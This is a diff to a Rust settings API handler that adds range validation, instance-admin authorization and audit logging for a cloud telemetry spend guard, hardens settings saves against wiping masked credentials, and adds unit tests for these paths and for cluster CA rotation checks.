+    let Some(factor) = cloud.telemetry_bulk_anomaly_factor else {
+        // Unset is the documented default, not an out-of-range value.
+        return Ok(());
+    };
+    if !factor.is_finite()
+        || !(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR..=MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR)
+            .contains(&factor)
+    {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "cloud.telemetry_bulk_anomaly_factor must be between \
+                 {MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} and \
+                 {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR} (got {factor}). This is the multiple \
+                 of its own estimate a project may ship before a bulk Temps Cloud activation \
+                 stops it, so it is a tuning range and not an off switch. A project that needs a \
+                 wider margin than {MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR}x should be activated \
+                 from the Cloud telemetry status card, which estimates it and shows the number \
+                 before anything is sent."
+            ))
+            .value(
+                "minimum",
+                MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
+            )
+            .value(
+                "maximum",
+                MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR.to_string(),
+            )
+            .build());
+    }
+    Ok(())
+}
+
+/// Confine *widening* the bulk-activation money guard to an instance operator.
+///
+/// Asymmetric on purpose, and the asymmetry is the whole point:
+///
+/// - **Narrowing** it (a smaller factor, a stricter guard) makes an activation
+///   more likely to stop early with its cursor intact. The worst outcome is a
+///   retry click, so ordinary `SettingsWrite` is the right bar — and requiring
+///   more would mean an operator who spots a runaway bill cannot tighten the
+///   guard without finding an administrator first.
+/// - **Widening** it raises the ceiling on what a purchase-triggered activation
+///   may spend with nobody confirming it. That is the same authority the
+///   operator bulk-activation endpoints already reserve to an instance
+///   administrator (`OtelWrite` + instance admin), and it would be incoherent
+///   for `POST /bulk-jobs` to demand it while a `SettingsWrite` holder could
+///   raise the ceiling on the very same spend through the settings document.
+///
+/// Scoped to this one field rather than to the endpoint: tightening the whole
+/// settings PUT to instance-admin would break every unrelated caller that
+/// legitimately holds `SettingsWrite`.
+fn authorize_bulk_activation_guard_change(
+    auth: &temps_auth::AuthContext,
+    previous: BulkActivationGuards,
+    next: BulkActivationGuards,
+) -> Result<(), Problem> {
+    if next.anomaly_factor <= previous.anomaly_factor || auth.is_instance_admin() {
+        return Ok(());
+    }
+    Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+        .type_("https://temps.sh/probs/insufficient-permissions")
+        .title("Instance Administrator Required")
+        .detail(format!(
+            "Raising cloud.telemetry_bulk_anomaly_factor from {} to {} widens the byte budget a \
+             bulk Temps Cloud telemetry activation may spend on a project before it stops, on a \
+             path that spends without a human confirming it. Loosening that guard is restricted \
+             to an instance administrator, the same bar the bulk activation endpoints \
+             themselves use. Lowering it, or leaving it alone, needs only settings:write.",
+            previous.anomaly_factor, next.anomaly_factor
+        ))
+        .value("required_role", temps_auth::Role::PlatformAdmin.to_string())
+        .value("user_role", auth.effective_role.to_string())
+        .value(
+            "current_anomaly_factor",
+            previous.anomaly_factor.to_string(),
+        )
+        .value("requested_anomaly_factor", next.anomaly_factor.to_string())
+        .build())
+}
+
+fn validate_observability_retention(
+    retention: &ObservabilityRetentionSettings,
+) -> Result<(), Problem> {
+    let values = [
+        ("proxy_logs_days", retention.proxy_logs_days),
+        ("otel_spans_days", retention.otel_spans_days),
+        ("otel_logs_days", retention.otel_logs_days),
+        ("otel_metrics_days", retention.otel_metrics_days),
+    ];
+    for (field, days) in values {
+        if !(1..=3650).contains(&days) {
+            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .detail(format!(
+                    "observability_retention.{field} must be between 1 and 3650"
+                ))
+                .build());
+        }
+    }
+    Ok(())
+}
+
 /// Normalize the edge target: trim whitespace and treat an empty string as
 /// `None` so an operator clearing the field disables DNS record sync.
 fn normalize_edge_target(settings: &mut AppSettings) {
@@ -827,9 +2318,81 @@ async fn update_settings(
     RequireAuth(auth): RequireAuth,
     State(app_state): State<Arc<SettingsState>>,
     Extension(metadata): Extension<RequestMetadata>,
-    Json(mut settings): Json<AppSettings>,
+    Json(body): Json<serde_json::Value>,
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
+
+    // Taken as raw JSON first, and only then turned into an `AppSettings`,
+    // because which `cloud.*` keys the client sent is information
+    // `#[serde(default)]` destroys: it cannot be recovered from the
+    // deserialized document. See `CloudFieldsSent`.
+    let cloud_fields_sent = CloudFieldsSent::from_settings_body(&body);
+    let mut settings: AppSettings = serde_path_to_error::deserialize(body).map_err(|e| {
+        let field = e.path().to_string();
+        ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Invalid Settings Payload")
+            .detail(format!(
+                "The settings document could not be read at `{}`: {}. Nothing was saved.",
+                field,
+                e.into_inner()
+            ))
+            .value("field", field)
+            .build()
+    })?;
+
+    // ADR-042 §6.3: the money guard on bulk Temps Cloud activation. Validated,
+    // authorized and captured here — before any other field is touched — for
+    // three reasons that all need the *previous* value, which a completed save
+    // can no longer produce: an out-of-range factor is refused rather than
+    // silently clamped, widening it needs the same instance-admin bar the bulk
+    // activation endpoints use, and the change is recorded as its own audit
+    // event with both sides.
+    //
+    // Validated against what the client actually sent, before anything is
+    // merged in from the DB: a stored value that predates a range change, or
+    // was hand-edited, must not make every unrelated save fail with a message
+    // about a field the client never mentioned. `effective_*` clamps such a row
+    // on read.
+    //
+    // A read failure aborts the save. Proceeding would mean applying a
+    // possibly-widened spend ceiling with neither the check nor the record that
+    // are supposed to accompany it.
+    validate_bulk_activation_guards(&settings.cloud)?;
+    let stored_settings = match app_state.config_service.get_settings().await {
+        Ok(current) => current,
+        Err(e) => {
+            error!(
+                "Could not read the current Temps Cloud bulk activation guard settings; \
+                 aborting settings save: {}",
+                e
+            );
+            return Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Settings Save Aborted")
+                .detail(format!(
+                    "Could not read the current Temps Cloud settings, so a change to the bulk \
+                     activation guards could be neither authorized nor recorded, and the fields \
+                     this client did not send could not be preserved; the save was aborted \
+                     rather than applied unchecked. Retry the save; if this persists, check \
+                     database connectivity: {}",
+                    e
+                ))
+                .build());
+        }
+    };
+
+    // Merge the `cloud` block *before* the guard comparison below, not after:
+    // a save that never mentioned `cloud` is not a request to widen the spend
+    // guard back to its default, and must be neither refused as one (403) nor
+    // recorded as one in the audit log.
+    preserve_cloud_settings_not_sent_by_every_client(
+        &mut settings,
+        &stored_settings,
+        cloud_fields_sent,
+    );
+
+    let previous_bulk_guards = BulkActivationGuards::from(&stored_settings.cloud);
+    let next_bulk_guards = BulkActivationGuards::from(&settings.cloud);
+    authorize_bulk_activation_guard_change(&auth, previous_bulk_guards, next_bulk_guards)?;
 
     // If sensitive fields are masked, preserve the existing values
     if let Some(ref key) = settings.dns_provider.cloudflare_api_key {
@@ -883,6 +2446,10 @@ async fn update_settings(
             // `#[serde(default)]` → None). Done first, before any field is moved
             // out of `current_settings` below.
             preserve_self_recorded_fields(&mut settings, &current_settings);
+            preserve_omitted_security_fields(&mut settings, &current_settings);
+            // The `cloud` block was already merged, further up: the ADR-042
+            // guard authorization depends on the merged value, so it cannot
+            // wait until here.
 
             // Per-provider credentials: keep existing unless caller supplied a new one
             for (id, current_cfg) in current_settings.agent_sandbox.providers.iter() {
@@ -930,9 +2497,8 @@ async fn update_settings(
             }
             // ClickHouse DSN: the GET response masks it to `clickhouse_url_set`
             // (it can embed credentials), so a client round-trip that doesn't
-            // re-supply it would otherwise wipe the stored DSN — and then trip
-            // the "clickhouse_url required when store is ClickHouse" validation
-            // below on an unrelated save. Restore from the DB when absent.
+            // re-supply it would otherwise wipe the stored DSN on an unrelated
+            // save. Restore from the DB when absent.
             if settings
                 .monitoring
                 .clickhouse_url
@@ -944,50 +2510,55 @@ async fn update_settings(
             }
         }
         Err(e) => {
-            tracing::warn!(
-                "Could not fetch current settings to preserve sensitive fields: {}",
+            // Abort rather than proceed: the preservation block above did not
+            // run, so saving now would silently overwrite every masked
+            // sensitive field the client legitimately omitted (ClickHouse DSN,
+            // preview-gateway shared_secret, join token hash, AI provider
+            // credentials) with empty values. A failed save the operator can
+            // retry is strictly better than an unannounced credential wipe.
+            tracing::error!(
+                "Could not fetch current settings to preserve sensitive fields; \
+                 aborting settings save: {}",
                 e
             );
+            return Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Settings Save Aborted")
+                .detail(format!(
+                    "Could not load current settings to preserve masked sensitive \
+                     fields (ClickHouse DSN, shared secrets, provider credentials); \
+                     the save was aborted to avoid wiping them. Retry the save; if \
+                     this persists, check database connectivity: {}",
+                    e
+                ))
+                .build());
         }
     }
 
-    // Validate monitoring settings fields.
-    {
-        let m = &settings.monitoring;
-        if m.scrape_interval_secs < 15 {
+    if let Some(ref backend) = settings.agent_sandbox.sandbox_backend {
+        let backend = backend.trim();
+        if backend != "docker" && backend != "firecracker" {
             return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
-                .detail("monitoring.scrape_interval_secs must be >= 15")
+                .title("Invalid Sandbox Backend")
+                .detail(format!(
+                    "sandbox_backend must be \"docker\" or \"firecracker\", got \"{}\"",
+                    backend
+                ))
                 .build());
-        }
-        if m.retention_raw_days < 1 || m.retention_raw_days > 30 {
-            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
-                .detail("monitoring.retention_raw_days must be between 1 and 30")
-                .build());
-        }
-        if m.retention_hourly_days < 7 || m.retention_hourly_days > 365 {
-            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
-                .detail("monitoring.retention_hourly_days must be between 7 and 365")
-                .build());
-        }
-        if m.store == MetricsStoreKind::ClickHouse {
-            match &m.clickhouse_url {
-                None => {
-                    return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
-                        .detail("monitoring.clickhouse_url is required when store is ClickHouse")
-                        .build());
-                }
-                Some(url) if url::Url::parse(url).is_err() => {
-                    return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
-                        .detail("monitoring.clickhouse_url is not a valid URL")
-                        .build());
-                }
-                _ => {}
-            }
         }
     }
+
+    validate_monitoring_settings(&settings.monitoring)?;
+    validate_ai_chat_limits(&settings.ai_chat_limits)?;
+    validate_ai_workspace_file_limits(&settings.ai_workspace_file_limits)?;
+    validate_request_timeouts(&settings.request_timeouts)?;
+
+    validate_observability_compression(&settings.observability_compression)?;
+    validate_observability_retention(&settings.observability_retention)?;
 
     settings.external_url = sanitize_optional_url("External", settings.external_url)?;
     settings.internal_url = sanitize_optional_url("Internal", settings.internal_url)?;
+    settings.registry_mirror_prefix =
+        sanitize_registry_mirror_prefix(settings.registry_mirror_prefix)?;
     // Validate and sanitize external_url
     if let Some(ref mut ext_url) = settings.external_url {
         *ext_url = ext_url.trim().to_string();
@@ -1048,6 +2619,42 @@ async fn update_settings(
                 error!("Failed to create audit log: {}", e);
             }
 
+            // ADR-042 §6.3: a change to either bulk-activation guard gets its
+            // own record with both sides, because `SETTINGS_UPDATED` carries no
+            // field-level values and a widened spend ceiling must not be
+            // indistinguishable from an unrelated save.
+            if next_bulk_guards != previous_bulk_guards {
+                let widened = next_bulk_guards.anomaly_factor > previous_bulk_guards.anomaly_factor;
+                info!(
+                    previous_anomaly_factor = previous_bulk_guards.anomaly_factor,
+                    new_anomaly_factor = next_bulk_guards.anomaly_factor,
+                    previous_rate_limit_spans_per_sec =
+                        previous_bulk_guards.rate_limit_spans_per_sec,
+                    new_rate_limit_spans_per_sec = next_bulk_guards.rate_limit_spans_per_sec,
+                    widened,
+                    "Temps Cloud bulk activation guard settings changed"
+                );
+                let guard_audit = CloudTelemetryBulkGuardUpdatedAudit {
+                    context: AuditContext {
+                        user_id: auth.user_id(),
+                        ip_address: Some(metadata.ip_address.clone()),
+                        user_agent: metadata.user_agent.clone(),
+                    },
+                    previous_anomaly_factor: previous_bulk_guards.anomaly_factor,
+                    new_anomaly_factor: next_bulk_guards.anomaly_factor,
+                    previous_rate_limit_spans_per_sec: previous_bulk_guards
+                        .rate_limit_spans_per_sec,
+                    new_rate_limit_spans_per_sec: next_bulk_guards.rate_limit_spans_per_sec,
+                    widened_anomaly_factor: widened,
+                };
+                if let Err(e) = app_state.audit_service.create_audit_log(&guard_audit).await {
+                    error!(
+                        "Failed to create the Temps Cloud bulk activation guard audit log: {}",
+                        e
+                    );
+                }
+            }
+
             Ok((
                 StatusCode::OK,
                 Json(SettingsUpdateResponse {
@@ -1081,8 +2688,8 @@ impl AuditOperation for JoinTokenGeneratedAudit {
     fn operation_type(&self) -> String {
         "JOIN_TOKEN_GENERATED".to_string()
     }
-    fn user_id(&self) -> i32 {
-        self.context.user_id
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
     }
     fn ip_address(&self) -> Option<String> {
         self.context.ip_address.clone()
@@ -1105,8 +2712,8 @@ impl AuditOperation for JoinTokenRevokedAudit {
     fn operation_type(&self) -> String {
         "JOIN_TOKEN_REVOKED".to_string()
     }
-    fn user_id(&self) -> i32 {
-        self.context.user_id
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
     }
     fn ip_address(&self) -> Option<String> {
         self.context.ip_address.clone()
@@ -1143,10 +2750,28 @@ async fn generate_join_token(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
 
+    // Keep the deprecated shared-token path safe for upgrades from older
+    // installations. Cluster trust belongs to the control plane and must
+    // exist before any credential capable of enrolling a worker is issued.
+    // Startup normally initializes it; this endpoint is a deterministic
+    // repair path for a process upgraded without a restart.
+    crate::cluster_ca::ensure_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+    )
+    .await
+    .map_err(|error| {
+        error!(%error, "Failed to initialize cluster CA before join-token generation");
+        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+            .title("Cluster CA Initialization Failed")
+            .detail("The join token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
+            .build()
+    })?;
+
     // Generate a random 32-byte token as hex
     let plaintext_token = {
-        let mut rng = rand::thread_rng();
-        let bytes: Vec<u8> = (0..32).map(|_| rng.gen::<u8>()).collect();
+        let mut rng = rand::rng();
+        let bytes: Vec<u8> = (0..32).map(|_| rng.random::<u8>()).collect();
         hex::encode(bytes)
     };
     let token_hash = sha256_hash(&plaintext_token);
@@ -1334,7 +2959,720 @@ async fn refresh_route_table(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use temps_core::{AgentSandboxSettings, AppSettings, ProviderConfig};
+    use temps_core::{
+        AgentSandboxSettings, AiChatLimitsSettings, AiWorkspaceFileLimitsSettings, AppSettings,
+        ProviderConfig,
+    };
+
+    fn rotation_test_user(mfa_enabled: bool) -> temps_entities::users::Model {
+        let now = chrono::Utc::now();
+        temps_entities::users::Model {
+            id: 71,
+            name: "CA Rotation Admin".to_string(),
+            email: "ca-rotation@example.com".to_string(),
+            password_hash: None,
+            email_verified: true,
+            email_verification_token: None,
+            email_verification_expires: None,
+            password_reset_token: None,
+            password_reset_expires: None,
+            must_change_password: false,
+            deleted_at: None,
+            mfa_secret: mfa_enabled.then(|| "test-secret".to_string()),
+            mfa_enabled,
+            mfa_recovery_codes: None,
+            oidc_subject: None,
+            oidc_provider_id: None,
+            created_at: now,
+            updated_at: now,
+        }
+    }
+
+    // ── ADR-042 §6.3 review, Finding 2: the bulk-activation money guard ──
+
+    fn guard_principal(role: temps_auth::Role) -> temps_auth::AuthContext {
+        temps_auth::AuthContext::new_session(rotation_test_user(false), role)
+    }
+
+    fn cloud_with_factor(factor: Option<f32>) -> CloudSettings {
+        CloudSettings {
+            telemetry_bulk_anomaly_factor: factor,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn an_anomaly_factor_above_the_ceiling_is_rejected_rather_than_silently_clamped() {
+        // Clamping on read alone would leave the settings page echoing back a
+        // number that is not in force — and lying in the one direction that
+        // costs money, because the operator would believe they had widened the
+        // spend guard when they had not.
+        for absurd in [
+            MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR + 0.5,
+            1_000.0,
+            f32::INFINITY,
+            f32::NAN,
+        ] {
+            let problem = validate_bulk_activation_guards(&cloud_with_factor(Some(absurd)))
+                .expect_err("an out-of-range factor must be refused");
+            assert_eq!(
+                problem.status_code,
+                StatusCode::BAD_REQUEST,
+                "{absurd} must be a 400"
+            );
+            let body = format!("{problem:?}");
+            assert!(body.contains("telemetry_bulk_anomaly_factor"), "{body}");
+            // The operator must learn the range *and* what to do when their
+            // project genuinely needs a wider margin than the ceiling allows.
+            assert!(body.contains("maximum"), "{body}");
+            assert!(body.contains("Cloud telemetry status card"), "{body}");
+        }
+    }
+
+    #[test]
+    fn a_factor_below_the_floor_is_rejected_too_and_the_whole_range_is_accepted() {
+        assert_eq!(
+            validate_bulk_activation_guards(&cloud_with_factor(Some(0.5)))
+                .expect_err("below the floor every project pauses on its first chunk")
+                .status_code,
+            StatusCode::BAD_REQUEST
+        );
+
+        for usable in [
+            None,
+            Some(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+            Some(temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+            Some(MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
+        ] {
+            assert!(
+                validate_bulk_activation_guards(&cloud_with_factor(usable)).is_ok(),
+                "{usable:?} is inside the tuning range and must be accepted"
+            );
+        }
+    }
+
+    #[test]
+    fn widening_the_money_guard_needs_an_instance_admin_but_narrowing_does_not() {
+        let previous = BulkActivationGuards::from(&cloud_with_factor(Some(5.0)));
+        let wider = BulkActivationGuards::from(&cloud_with_factor(Some(40.0)));
+        let narrower = BulkActivationGuards::from(&cloud_with_factor(Some(2.0)));
+
+        // A settings:write holder who is not an instance admin may tighten the
+        // guard — an operator watching a bill run away must never have to find
+        // an administrator before they can stop it — but not loosen it.
+        let ordinary = guard_principal(temps_auth::Role::User);
+        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, narrower).is_ok());
+        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, previous).is_ok());
+
+        let refused = authorize_bulk_activation_guard_change(&ordinary, previous, wider)
+            .expect_err("loosening the money guard is an instance-admin action");
+        assert_eq!(refused.status_code, StatusCode::FORBIDDEN);
+        let body = format!("{refused:?}");
+        assert!(body.contains("required_role"), "{body}");
+        assert!(body.contains("requested_anomaly_factor"), "{body}");
+
+        // The bar the operator bulk-activation endpoints already use.
+        for role in [temps_auth::Role::Admin, temps_auth::Role::PlatformAdmin] {
+            assert!(
+                authorize_bulk_activation_guard_change(
+                    &guard_principal(role.clone()),
+                    previous,
+                    wider
+                )
+                .is_ok(),
+                "{role} runs the instance and may widen its own spend guard"
+            );
+        }
+    }
+
+    #[test]
+    fn omitting_the_factor_is_not_treated_as_a_change_let_alone_a_widening() {
+        // The settings PUT replaces the whole document, so a client built before
+        // this field existed sends `None`. `None` and `Some(5.0)` are the same
+        // guard, and refusing every such save with a 403 would break every
+        // unrelated settings write on the instance.
+        let unset = BulkActivationGuards::from(&cloud_with_factor(None));
+        let explicit_default = BulkActivationGuards::from(&cloud_with_factor(Some(
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
+        )));
+
+        assert_eq!(unset, explicit_default);
+        assert!(authorize_bulk_activation_guard_change(
+            &guard_principal(temps_auth::Role::User),
+            unset,
+            explicit_default
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn a_guard_change_is_audited_with_both_sides_and_the_direction() {
+        // `SETTINGS_UPDATED` carries no field-level values, so under it alone a
+        // widened spend ceiling is indistinguishable from a display-name change.
+        let event = CloudTelemetryBulkGuardUpdatedAudit {
+            context: AuditContext {
+                user_id: 71,
+                ip_address: Some("127.0.0.1".to_string()),
+                user_agent: "test".to_string(),
+            },
+            previous_anomaly_factor: 5.0,
+            new_anomaly_factor: 40.0,
+            previous_rate_limit_spans_per_sec: Some(5_000),
+            new_rate_limit_spans_per_sec: None,
+            widened_anomaly_factor: true,
+        };
+
+        assert_eq!(
+            AuditOperation::operation_type(&event),
+            "CLOUD_TELEMETRY_BULK_GUARD_UPDATED"
+        );
+        let serialized = AuditOperation::serialize(&event).expect("must serialize");
+        assert!(
+            serialized.contains("\"previous_anomaly_factor\":5.0"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"new_anomaly_factor\":40.0"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"previous_rate_limit_spans_per_sec\":5000"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"new_rate_limit_spans_per_sec\":null"),
+            "{serialized}"
+        );
+        assert!(
+            serialized.contains("\"widened_anomaly_factor\":true"),
+            "{serialized}"
+        );
+    }
+
+    #[test]
+    fn a_throttle_change_alone_is_still_a_recordable_guard_change() {
+        // The rate limit is the other half of what governs how fast a paid-for
+        // activation spends. A change to it with the factor untouched must not
+        // fall through the "did anything change" check.
+        let previous = BulkActivationGuards::from(&CloudSettings {
+            telemetry_bulk_rate_limit_spans_per_sec: Some(1_000),
+            ..Default::default()
+        });
+        let next = BulkActivationGuards::from(&CloudSettings {
+            telemetry_bulk_rate_limit_spans_per_sec: None,
+            ..Default::default()
+        });
+
+        assert_ne!(previous, next);
+        // …and removing a throttle is not a widening of the money guard, so it
+        // stays under ordinary settings:write.
+        assert!(authorize_bulk_activation_guard_change(
+            &guard_principal(temps_auth::Role::User),
+            previous,
+            next
+        )
+        .is_ok());
+    }
+
+    fn disconnected_authorizer() -> temps_auth::DefaultSensitiveActionAuthorizer {
+        temps_auth::DefaultSensitiveActionAuthorizer::new(Arc::new(
+            sea_orm::DatabaseConnection::Disconnected,
+        ))
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_rejects_machine_credentials_even_with_permission() {
+        let auth = temps_auth::AuthContext::new_api_key(
+            rotation_test_user(true),
+            None,
+            Some(vec![
+                temps_auth::Permission::SettingsWrite,
+                temps_auth::Permission::ClusterCaRotate,
+            ]),
+            "rotation-key".to_string(),
+            19,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("API keys must never rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!(
+                "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED"
+            ))
+        );
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_rejects_platform_administrators() {
+        let auth = temps_auth::AuthContext::new_persisted_session(
+            rotation_test_user(true),
+            temps_auth::Role::PlatformAdmin,
+            24,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("platform administrators must not rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!("CLUSTER_CA_ROTATION_ADMIN_REQUIRED"))
+        );
+    }
+
+    #[tokio::test]
+    async fn cluster_ca_rotation_requires_mfa_enrollment() {
+        let auth = temps_auth::AuthContext::new_persisted_session(
+            rotation_test_user(false),
+            temps_auth::Role::Admin,
+            23,
+        );
+
+        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
+            .await
+            .expect_err("an admin without MFA must not rotate the cluster CA");
+        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
+        assert_eq!(
+            error.body.get("error_code"),
+            Some(&serde_json::json!("CLUSTER_CA_ROTATION_MFA_REQUIRED"))
+        );
+    }
+
+    /// An operator's decision to forbid console updates must survive a save
+    /// from a client that has never heard of the field.
+    ///
+    /// `AppSettings` deserializes with `#[serde(default)]` and the PUT replaces
+    /// the whole document, so an omitted `self_update` used to come back as
+    /// "enabled" — silently re-arming the server's ability to replace its own
+    /// binary. Regression test for that: absence means "leave it alone".
+    #[test]
+    fn omitting_self_update_preserves_the_stored_value() {
+        let current = AppSettings {
+            self_update: Some(temps_core::SelfUpdateSettings {
+                enabled: false,
+                channel: Some("stable".to_string()),
+            }),
+            ..AppSettings::default()
+        };
+        // What serde produces for a body that never mentioned the field.
+        let mut incoming = AppSettings {
+            self_update: None,
+            ..AppSettings::default()
+        };
+
+        preserve_omitted_security_fields(&mut incoming, &current);
+
+        let effective = incoming.self_update();
+        assert!(
+            !effective.enabled,
+            "an omitted self_update must not re-enable console updates"
+        );
+        assert_eq!(effective.channel.as_deref(), Some("stable"));
+    }
+
+    /// An explicit value still wins — this is a preserve, not a freeze.
+    #[test]
+    fn an_explicit_self_update_value_overrides_the_stored_one() {
+        let current = AppSettings {
+            self_update: Some(temps_core::SelfUpdateSettings {
+                enabled: false,
+                channel: None,
+            }),
+            ..AppSettings::default()
+        };
+        let mut incoming = AppSettings {
+            self_update: Some(temps_core::SelfUpdateSettings {
+                enabled: true,
+                channel: Some("beta".to_string()),
+            }),
+            ..AppSettings::default()
+        };
+
+        preserve_omitted_security_fields(&mut incoming, &current);
+
+        let effective = incoming.self_update();
+        assert!(effective.enabled);
+        assert_eq!(effective.channel.as_deref(), Some("beta"));
+    }
+
+    /// A never-configured install reads as the documented default.
+    #[test]
+    fn absent_self_update_reads_as_enabled_by_default() {
+        let settings = AppSettings::default();
+        assert!(settings.self_update.is_none());
+        assert!(settings.self_update().enabled);
+        assert_eq!(settings.self_update().channel, None);
+    }
+
+    #[test]
+    fn generic_settings_update_cannot_enable_cloud_exports() {
+        let current = AppSettings::default();
+        let mut incoming = AppSettings::default();
+        incoming.cloud.telemetry_enabled = true;
+        incoming.cloud.backups_enabled = true;
+        incoming.cloud.notifications_enabled = true;
+
+        preserve_cloud_settings_not_sent_by_every_client(
+            &mut incoming,
+            &current,
+            CloudFieldsSent::default(),
+        );
+
+        assert!(!incoming.cloud.telemetry_enabled);
+        assert!(!incoming.cloud.backups_enabled);
+        assert!(!incoming.cloud.notifications_enabled);
+    }
+
+    #[test]
+    fn generic_settings_update_preserves_existing_cloud_export_consent() {
+        let mut current = AppSettings::default();
+        current.cloud.telemetry_enabled = true;
+        current.cloud.backups_enabled = true;
+        current.cloud.notifications_enabled = true;
+        let mut incoming = AppSettings::default();
+
+        preserve_cloud_settings_not_sent_by_every_client(
+            &mut incoming,
+            &current,
+            CloudFieldsSent::default(),
+        );
+
+        assert!(incoming.cloud.telemetry_enabled);
+        assert!(incoming.cloud.backups_enabled);
+        assert!(incoming.cloud.notifications_enabled);
+    }
+
+    /// A settings row whose operator-tuned Cloud fields have all been moved off
+    /// their defaults, so that "reset to default" is visible as a failure.
+    fn stored_settings_with_tuned_cloud_fields() -> AppSettings {
+        let mut current = AppSettings::default();
+        // ADR-041: a bigger outbox than the 512 MiB default, and a Cloud that
+        // is not the production one.
+        current.cloud.backend_url = "https://cloud.staging.example".to_string();
+        current.cloud.telemetry_outbox_max_bytes = 1024 * 1024 * 1024;
+        // ADR-042: a narrowed spend guard and a throttled backfill.
+        current.cloud.telemetry_bulk_anomaly_factor = Some(2.0);
+        current.cloud.telemetry_bulk_rate_limit_spans_per_sec = Some(5_000);
+        current
+    }
+
+    /// Mirror exactly what `update_settings` does with a request body: read key
+    /// presence off the raw JSON, deserialize, then merge the stored `cloud`
+    /// block in. Testing from the wire format is the point — the bug being
+    /// guarded against lives in the gap between "key absent" and "value equals
+    /// the default", which no test built from an `AppSettings` value could see.
+    fn merge_settings_body(body: serde_json::Value, current: &AppSettings) -> AppSettings {
+        let sent = CloudFieldsSent::from_settings_body(&body);
+        let mut incoming: AppSettings =
+            serde_json::from_value(body).expect("settings body should deserialize");
+        preserve_cloud_settings_not_sent_by_every_client(&mut incoming, current, sent);
+        incoming
+    }
+
+    /// The console's own save has never carried a `cloud` block, and no client
+    /// built before ADR-041/ADR-042 does either. Such a save must leave every
+    /// operator-tuned Cloud field exactly as stored, not reset it to the
+    /// build-time default.
+    #[test]
+    fn a_settings_save_that_omits_the_cloud_block_keeps_the_stored_spend_guards() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        // A realistic unrelated save: some other settings page, no `cloud` key.
+        let merged = merge_settings_body(
+            serde_json::json!({
+                "preview_domain": "apps.example.test",
+                "insecure_tls": false,
+            }),
+            &current,
+        );
+
+        // ADR-042 §6.3 — the narrowed money guard survives.
+        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(2.0));
+        assert_eq!(merged.cloud.effective_bulk_anomaly_factor(), 2.0);
+        assert_ne!(
+            merged.cloud.effective_bulk_anomaly_factor(),
+            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
+        );
+        // ADR-042 §3 — the throttle survives.
+        assert_eq!(
+            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
+            Some(5_000)
+        );
+        // ADR-041 — the outbox ceiling and the Cloud destination survive.
+        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
+        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
+    }
+
+    /// The same save must also not *look* like a guard change, or an operator
+    /// holding only `settings:write` would be refused with a 403 (widening 2x
+    /// back to the 5x default is instance-admin only) and the audit log would
+    /// record a spend-guard change that nobody made.
+    #[test]
+    fn a_settings_save_that_omits_the_cloud_block_is_not_a_guard_change() {
+        let current = stored_settings_with_tuned_cloud_fields();
+
+        let merged = merge_settings_body(
+            serde_json::json!({ "preview_domain": "apps.example.test" }),
+            &current,
+        );
+
+        assert_eq!(
+            BulkActivationGuards::from(&merged.cloud),
+            BulkActivationGuards::from(&current.cloud)
+        );
+    }
+
